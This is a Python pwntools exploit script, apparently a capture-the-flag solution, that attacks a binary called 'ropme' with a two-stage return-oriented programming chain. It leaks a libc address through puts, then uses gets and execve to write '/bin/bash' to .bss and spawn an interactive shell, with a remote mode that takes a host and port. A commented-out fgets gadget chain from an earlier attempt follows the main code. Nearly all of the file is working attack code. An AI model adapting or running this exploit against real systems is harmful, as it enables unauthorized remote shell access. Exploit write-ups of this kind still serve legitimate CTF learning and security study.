#!/usr/bin/python3
from pwn import *
import sys


'''
This is a relatively simple (But hard to figure out) rop attack on a binary.
What happens is that first the library used is determined by gathering the __libc_start_main
symbol from the loaded binary. This information can then be used to find and download the appropriate
library from the library database.

In this particular challenge, the /bin/sh program on the server was creating chaos, so system(/bin/sh) 
was off the table. So, the next approach was to use execve to execute bash. The downside of this is that you need a pointer to
an array of pointers, and this requires we know a memory location. 

Since it was not possible (with my current skill level) to leak a stack address, I used the bss + offset section
which is writeable with partial relro. Now we know where our shell string will be located
With this information, an attack is performed that uses gets to store the string. I tried, using fgets, before it dawned
on my to use gets, but I had a hard time getting the got entry of stdin. As in, I could not. I tried mimicing
the calling in main() using rop gadgets, which in the end got me a shell, but the same gadgets where not present
in the library the server uses, so I could not execute there.

Finally, gets came to the rescue. Using a simple shellstring to bss -> exeve attack spawned me a shell. 

'''

EXEC = "./ropme"

if len(sys.argv) > 1:

    if sys.argv[1] == '--debug':
        p = gdb.debug(EXEC)
        libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
    elif sys.argv[1] == '--remote':
        host = sys.argv[2]
        port = int(sys.argv[3])
        p = connect(host, port)
        libc = ELF("./libc.so.6")
    else:
        print("See file for usage")
        quit()
else:
    p = process(EXEC)
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")


context(arch='amd64', os='linux', endian='little', word_size=64)

elf = ELF(EXEC)
rop = ROP(elf)


PUTS = elf.plt['puts']
MAIN = elf.symbols['main']
FGETS = elf.plt['fgets']
STDIN = elf.symbols['stdin']
LIBC_START_MAIN = elf.got['__libc_start_main']  # Always use this elf.got to get __libc_start_main Si no, rompe
POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0]
POP_RSI = (rop.find_gadget(['pop rsi', 'pop r15', 'ret']))[0]
BUF_SIZE = 64
DUMMY = 0xdeadbeefb00bf4ce
NULL = 0x00
BSS = elf.symbols['__bss_start'] + 100
SHELL = b"/bin/bash\0".ljust(16, b'\x00')
SHELL_LEN = 16
SHELL_PTR = BSS + 16


log.info('main                  : ' + hex(MAIN))
log.info('puts@plt              : ' + hex(PUTS) )
log.info("__libc_start_main@got : " + hex(LIBC_START_MAIN))
log.info("stdin@symbols.elf     : " + hex(STDIN))
log.info('pop rdi; ret          : ' + hex(POP_RDI))
log.info('pop rsi; pop r15; ret : ' + hex(POP_RSI))
log.info('dummy                 : ' + hex(DUMMY))
log.info('BUF_SIZE              : ' + str(BUF_SIZE))
log.info('__bss_start@symbols   : ' + hex(BSS))
log.info('Shell pointer         : ' + hex(SHELL_PTR))
log.info('shell string:         :'  + str(SHELL))
log.info('shell string length   :'  + str(SHELL_LEN))



''' Stage one, extract vaddr of __libc_start_main. Then loop back to main to get a new input'''
payload = Buffer()
payload.add(b'A' * BUF_SIZE)
payload.add(p64(DUMMY))
# Setup puts command to leak __libc_start_main
payload.add(p64(POP_RDI))
payload.add(p64(LIBC_START_MAIN))
payload.add(p64(PUTS))
payload.add(p64(MAIN))

log.info('Sending stage 1 : Extract vaddr __libc_start_main')
p.sendlineafter('?', payload.get())
p.recvline()
result = p.recvline()


addr_libc_start_main = result.strip(b'\n')
addr_libc_start_main = u64(addr_libc_start_main.ljust(8, b'\x00'))

log.info("__libc_start_main " + hex(addr_libc_start_main))




libc.address = addr_libc_start_main - libc.symbols['__libc_start_main']

EXECVE = libc.sym['execve']
GETS   = libc.sym['gets']


''' Stage two, upload shellstring and spawn shell'''

payload = Buffer()
payload.add(b'a' * BUF_SIZE)
payload.add(p64(DUMMY))
payload.add(p64(POP_RDI))
payload.add(p64(BSS))
payload.add(p64(GETS))
payload.add(p64(POP_RDI))
payload.add(p64(BSS))
payload.add(p64(POP_RSI))
payload.add(p64(SHELL_PTR))
payload.add(p64(DUMMY))
payload.add(p64(EXECVE))
payload.add(p64(MAIN)) # Ret2main

p.sendlineafter("?", payload.get())

payload = Buffer()
payload.add(SHELL)
payload.add(p64(BSS))
payload.add(p64(NULL))
p.sendline(payload.get())



p.interactive()

'''
Failed / complicated attempt below
'''
# if len (sys.argv) > 1 and sys.argv[1] == '--remote':
#     #0x0000000000033544 : pop rax ; ret
#     #0x00000000001289f8 : mov rax, qword ptr [rax] ; ret
#
#
#     POP_RAX = libc.address + int(b"0x000000000003cff8", 16)
#     MOV_RAX = libc.address + int(b"0x000000000011a0a8", 16)
#     MOV_R8 = libc.address + int(b"0x00000000000b623b", 16)
#     ADD_RDX = libc.address + int(b"0x000000000004ab11", 16)
#     POP_RDX = libc.address + int(b"0x0000000000107545", 16)
# else:
#     # 0x000000000003cff8 : pop rax ; ret
#     # 0x000000000011a0a8 : mov rax, qword ptr [rax] ; ret
#     # 0x00000000000b623b : mov r8, rax ; mov rax, r8 ; ret
#     # POP_RDX
#     # NULL
#     # 0x000000000004ab11 : add rdx, r8 ; mov rax, rdx ; pop rbx ; ret
#     # 0x0000000000107545 : pop rdx ; ret
#/
#     POP_RAX = libc.address + int(b"0x000000000003cff8", 16)
#     MOV_RAX = libc.address + int(b"0x000000000011a0a8", 16)
#     MOV_R8 = libc.address + int(b"0x00000000000b623b", 16)
#     ADD_RDX = libc.address + int(b"0x000000000004ab11", 16)
#     POP_RDX = libc.address + int(b"0x0000000000107545", 16)
#
# log.info("pop_rax : " + hex(POP_RAX))
# log.info("mov_rax : " + hex(MOV_RAX))
# log.info("mov r8 : " + hex(MOV_R8))
# log.info("mov rdx : " + hex(ADD_RDX))
# log.info('symbols@execve        : ' +hex(EXECVE))
#
#
# # Setup gets command to read shell string into bss
# payload.add(cyclic(BUF_SIZE))
# payload.add(p64(DUMMY))
# payload.add(p64(POP_RDI))
# payload.add(p64(BSS))  # Destination
# payload.add(p64(POP_RSI))
# payload.add(p64(SHELL_LEN))
# payload.add(p64(DUMMY))
# payload.add(p64(POP_RAX))
# payload.add(p64(STDIN))
# payload.add(p64(MOV_RAX))
# payload.add(p64(MOV_R8))
# payload.add(p64(POP_RDX))
# payload.add(p64(NULL))
# payload.add(p64(ADD_RDX))
# payload.add(p64(DUMMY))
# payload.add(p64(FGETS))  # Execute read
# payload.add(p64(POP_RAX))
# payload.add(p64(NULL))
# payload.add(p64(POP_RDX))
# payload.add(p64(NULL))
# payload.add(p64(MOV_R8))
# # --- exec payload ---
# payload.add(p64(POP_RDI))
# payload.add(p64(BSS))
# payload.add(p64(POP_RSI))
# payload.add(p64(SHELL_PTR))
# payload.add(p64(DUMMY))
# payload.add(p64(EXECVE))
# payload.add(p64(MAIN)) # Ret2main

# log.info("Stage 2: Upload shell string into .bss")
# p.sendlineafter('?', payload.get())
#
# payload = Buffer()
# payload.add(SHELL)
# payload.add(p64(BSS))
# payload.add(p64(NULL))
# p.sendline(payload.get())
#
# p.interactive()
#
#
#
